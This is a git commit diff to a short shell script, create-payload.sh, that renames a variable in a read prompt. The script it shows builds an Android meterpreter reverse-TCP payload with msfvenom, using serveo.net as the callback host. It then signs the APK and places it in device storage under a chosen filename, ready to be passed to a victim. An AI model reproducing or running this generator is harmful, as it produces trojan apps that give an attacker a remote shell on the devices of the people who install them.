9bc0d1fd1617b16a1a5c523fe4a05297cda10e54
MmxKnows <45761847+MmxKnows@users.noreply.github.com>
2019-04-09 14:14:02 +0530

    Update create-payload.sh

--- create-payload.sh
+++ create-payload.sh
@@ -2,7 +2,7 @@
 # payload gen on msf
 
 read -p 'Enter port for serveo: ' port
-read -p 'Enter output filename: ' output.apk
+read -p 'Enter output filename: ' output
 msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port R > Newtest.apk
 apksigner autokey Newtest.apk Testing.apk
 mv Testing.apk ~/storage/dcim/$output.apk
